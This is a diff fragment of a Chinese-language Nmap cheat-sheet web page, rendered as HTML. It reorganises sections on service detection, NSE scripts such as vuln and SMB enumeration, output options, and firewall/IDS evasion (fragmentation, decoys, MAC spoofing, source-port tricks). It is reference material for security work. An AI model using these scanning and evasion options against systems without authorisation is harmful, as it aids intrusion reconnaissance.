-&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
-&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
-&lt;/span&gt;&lt;span class="lnt"&gt;2
-&lt;/span&gt;&lt;span class="lnt"&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class="lntd"&gt;
-&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-txt" data-lang="txt"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;192.168.1.100
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;192.168.1.101
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;scanme.nmap.org
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-ir"&gt;&lt;code&gt;-iR&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：随机选择扫描目标。随机扫描10个IP地址&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -iR 10 -Pn&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-exclude"&gt;&lt;code&gt;-exclude&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：排除扫描目标&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap 192.168.1.0/24 --exclude 192.168.1.100,192.168.1.101&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-excludefile"&gt;&lt;code&gt;-excludefile&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：排除文件中目标列表&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap 192.168.1.0/24 --excludefile exclude.txt&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-n"&gt;&lt;code&gt;-n&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：不用域名解析（加快扫描速度，不进行反向DNS查询。）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -n 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-r"&gt;&lt;code&gt;-R&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：为所有目标解析域名。即使目标以IP形式给出，也进行DNS解析。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -R scanme.nmap.org&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-e"&gt;&lt;code&gt;-e&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定网络接口&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -e eth0 192.168.1.0/24&lt;/code&gt;、&lt;code&gt;nmap -e eth0 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="-6"&gt;&lt;code&gt;-6&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：IPv6扫描&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --traceroute 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--traceroute"&gt;&lt;code&gt;--traceroute&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：路由跟踪&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --iflist&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--system-dns"&gt;&lt;code&gt;--system-dns&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用系统DNS解析器而不是内置解析器&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --system-dns 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--spoof-mac"&gt;&lt;code&gt;--spoof-mac&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：MAC地址欺骗&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --spoof-mac 00:11:22:33:44:55 192.168.1.100&lt;/code&gt;、&lt;code&gt;nmap --spoof-mac 0 # 随机MAC地址&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--badsum"&gt;&lt;code&gt;--badsum&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：发送错误校验和&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --badsum 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--resume"&gt;&lt;code&gt;--resume&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：从上次中断的地方继续扫描。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --resume scan.log&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--privileged----unprivileged"&gt;&lt;code&gt;--privileged / --unprivileged&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：当以非root用户运行时模拟原始套接字。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --unprivileged 192.168.1.100 # 非特权模式&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--source-port"&gt;&lt;code&gt;--source-port&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用特定源端口（如53端口可能被防火墙允许）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --source-port 53 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--data-length"&gt;&lt;code&gt;--data-length&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：添加随机数据,在每个包后添加指定长度的随机数据。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --data-length 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id="服务版本探测"&gt;服务/版本探测
+&lt;h2 id="服务和版本探测"&gt;服务和版本探测
 &lt;/h2&gt;&lt;h3 id="-sv"&gt;&lt;code&gt;-sV&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：识别服务类型（HTTP、FTP等）和服务版本号，获取详细服务信息&lt;/li&gt;
@@ -314,18 +291,18 @@
 &lt;/ul&gt;
 &lt;h3 id="-a"&gt;&lt;code&gt;-A&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测目标主机的操作系统类型&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：启用操作系统检测、版本检测、脚本扫描和路由追踪（聚合功能）&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -A 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id="nse脚本引擎"&gt;NSE脚本引擎
-&lt;/h2&gt;&lt;h3 id="-sc---scriptdefault"&gt;&lt;code&gt;-sC&lt;/code&gt; /&lt;code&gt;--script=default&lt;/code&gt;
+&lt;h2 id="nse-脚本引擎"&gt;NSE 脚本引擎
+&lt;/h2&gt;&lt;h3 id="-sc----scriptdefault"&gt;&lt;code&gt;-sC&lt;/code&gt; / &lt;code&gt;--script=default&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用默认脚本进行扫描&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sC 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id="-scriptlua-scripts"&gt;&lt;code&gt;-script=&amp;lt;Lua scripts&amp;gt;&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：&lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用某个或某类脚本进行扫描，支持通配符描述&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -script=vuln 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;脚本分类&lt;/strong&gt;：
 &lt;ul&gt;
@@ -353,21 +330,27 @@
 &lt;/ul&gt;
 &lt;h3 id="script-args-filefilename"&gt;&lt;code&gt;–script-args-file=filename&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用文件来为脚本提供参数&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --script smb-enum-shares --script-args-file smb-args.txt 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;smb-args.txt&lt;/code&gt;内容&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用文件来为脚本提供参数&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --script smb-enum-shares --script-args-file smb-args.txt 192.168.1.100&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;smb-args.txt&lt;/code&gt;内容&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
 &lt;/span&gt;&lt;span class="lnt"&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
-&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-TEXT" data-lang="TEXT"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smbuser=admin
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smbuser=admin
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smbpass=password123
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id="script-trace"&gt;&lt;code&gt;–script-trace&lt;/code&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="script-trace"&gt;&lt;code&gt;–script-trace&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：显示脚本执行过程中发送与接收的数据&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -O -script-trace 192.168.1.100&lt;/code&gt;&lt;/li&gt;
@@ -380,9 +363,9 @@
 &lt;h3 id="script-helpscripts"&gt;&lt;code&gt;–script-help=&amp;lt;scripts&amp;gt;&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别。查看所有http漏洞相关脚本的帮助信息：&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -script-help http-voln-*&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -script-help http-vuln-*&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id="输出选项"&gt;输出选项
+&lt;h2 id="输出格式与详情"&gt;输出格式与详情
 &lt;/h2&gt;&lt;h3 id="-on"&gt;&lt;code&gt;-oN&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：输出至普通文本文件&lt;/li&gt;
@@ -398,36 +381,18 @@
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：一次性输出所有主要格式&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -oA result 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="--open"&gt;&lt;code&gt;--open&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：只显示开放端口&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --open 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--reason"&gt;&lt;code&gt;--reason&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：显示端口状态原因.显示为什么端口被标记为开放/关闭/过滤。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --reason 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--packet-trace"&gt;&lt;code&gt;--packet-trace&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：数据包跟踪,显示发送和接收的每个数据包。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --packet-trace 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--iflist"&gt;&lt;code&gt;--iflist&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：列出接口和路由&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --iflist&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
 &lt;h3 id="--append-output"&gt;&lt;code&gt;--append-output&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：追加输出,追加到现有日志文件而不是覆盖。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：追加输出，追加到现有日志文件而不是覆盖。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -oN scan.log --append-output 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="-v-vv-d--dd"&gt;&lt;code&gt;-v&lt;/code&gt;/&lt;code&gt;-vv&lt;/code&gt;/&lt;code&gt;-d&lt;/code&gt;/&lt;code&gt; -dd&lt;/code&gt;
+&lt;h3 id="-v---vv---d---dd"&gt;&lt;code&gt;-v&lt;/code&gt; / &lt;code&gt;-vv&lt;/code&gt; / &lt;code&gt;-d&lt;/code&gt; / &lt;code&gt;-dd&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：详细/调试输出&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/li&gt;
-&lt;/ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：详细/调试输出&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
@@ -436,19 +401,100 @@
 &lt;/span&gt;&lt;span class="lnt"&gt;4
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class="lntd"&gt;
-&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -v 192.168.1.100 &lt;span class="c1"&gt;# 详细输出&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -vv 192.168.1.100 &lt;span class="c1"&gt;# 更详细&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -d 192.168.1.100 &lt;span class="c1"&gt;# 调试级别1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -dd 192.168.1.100 &lt;span class="c1"&gt;# 调试级别2&lt;/span&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -v 192.168.1.100 # 详细输出
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -vv 192.168.1.100 # 更详细
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -d 192.168.1.100 # 调试级别1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -dd 192.168.1.100 # 调试级别2
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id="性能与防火墙规避"&gt;性能与防火墙规避
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="扫描结果筛选与解释"&gt;扫描结果筛选与解释
+&lt;/h2&gt;&lt;h3 id="--open"&gt;&lt;code&gt;--open&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：只显示开放端口&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --open 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--reason"&gt;&lt;code&gt;--reason&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：显示端口状态原因。显示为什么端口被标记为开放/关闭/过滤。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --reason 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="调试与信息收集"&gt;调试与信息收集
+&lt;/h2&gt;&lt;h3 id="--packet-trace"&gt;&lt;code&gt;--packet-trace&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：数据包跟踪，显示发送和接收的每个数据包。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --packet-trace 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--iflist"&gt;&lt;code&gt;--iflist&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：列出接口和路由&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --iflist&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--traceroute"&gt;&lt;code&gt;--traceroute&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：路由跟踪&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --traceroute 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="网络与dns配置"&gt;网络与DNS配置
+&lt;/h2&gt;&lt;h3 id="-n"&gt;&lt;code&gt;-n&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：不用域名解析（加快扫描速度，不进行反向DNS查询。）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -n 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-r"&gt;&lt;code&gt;-R&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：为所有目标解析域名。即使目标以IP形式给出，也进行DNS解析。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -R scanme.nmap.org&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--system-dns"&gt;&lt;code&gt;--system-dns&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用系统DNS解析器而不是内置解析器&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --system-dns 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-e"&gt;&lt;code&gt;-e&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定网络接口&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -e eth0 192.168.1.0/24&lt;/code&gt;、&lt;code&gt;nmap -e eth0 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-6"&gt;&lt;code&gt;-6&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：IPv6扫描&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -6 2001:db8::1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="性能与定时控制"&gt;性能与定时控制
 &lt;/h2&gt;&lt;h3 id="-t0-5"&gt;&lt;code&gt;-T&amp;lt;0-5&amp;gt;&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：时序模板，数字越大越快,也越易被发现&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：时序模板，数字越大越快，也越易被发现&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -T4 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="-f-1"&gt;&lt;code&gt;-f&lt;/code&gt;
+&lt;h3 id="--min-rate"&gt;&lt;code&gt;--min-rate&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最小速率。确保扫描速度不低于每秒100个包。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --min-rate 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--max-rate"&gt;&lt;code&gt;--max-rate&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最大速率。限制扫描速度不超过每秒10个包。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --max-rate 10 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--scan-delay"&gt;&lt;code&gt;--scan-delay&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测速率控制。每次探测间隔100ms&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --scan-delay 100ms 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--min-parallelism----max-parallelism"&gt;&lt;code&gt;--min-parallelism&lt;/code&gt; / &lt;code&gt;--max-parallelism&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：并行度&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --min-parallelism 10 --max-parallelism 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--max-retries"&gt;&lt;code&gt;--max-retries&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最大重试次数&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --max-retries 1 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="防火墙ids规避与欺骗"&gt;防火墙/IDS规避与欺骗
+&lt;/h2&gt;&lt;h3 id="-f-1"&gt;&lt;code&gt;-f&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用小数据包分片&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -f 192.168.1.100&lt;/code&gt;&lt;/li&gt;
@@ -458,41 +504,1605 @@
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用诱饵IP进行隐藏&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -D RND:10 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="--scan-delay"&gt;&lt;code&gt;--scan-delay&lt;/code&gt;
+&lt;h3 id="--source-port"&gt;&lt;code&gt;--source-port&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测速率控制.每次探测间隔100ms&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --scan-delay 100ms 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用特定源端口（如53端口可能被防火墙允许）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --source-port 53 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id="--max-rate"&gt;&lt;code&gt;--max-rate&lt;/code&gt;
+&lt;h3 id="--data-length"&gt;&lt;code&gt;--data-length&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
